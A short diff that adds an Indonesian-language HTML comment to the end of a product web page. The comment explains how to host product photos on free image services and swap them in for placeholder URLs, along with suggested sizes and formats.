+    <!-- INSTRUKSI PENGGUNAAN FOTO:
+    
+    1. Upload foto produk Anda ke hosting gratis seperti:
+       - GitHub (raw.githubusercontent.com)
+       - ImgBB (i.ibb.co)
+       - Imgur (i.imgur.com)
+       - Google Drive (drive.google.com - set public)
+    
+    2. Ganti URL_FOTO_ANDA dengan link foto asli:
+       Contoh:
+       URL_FOTO_IPHONE_ANDA → https://i.ibb.co/abc123/iphone15.jpg
+       URL_FOTO_NMAX_ANDA → https://i.imgur.com/def456.jpg
+    
+    3. Format foto yang disarankan:
+       - Ukuran: 400x400px atau 500x500px
+       - Format: JPG, PNG, WebP
+       - Kualitas: HD untuk tampilan terbaik
+    
+    4. Jika foto gagal load, emoji akan tetap muncul sebagai fallback
+    
+    -->
 </body>
 </html>
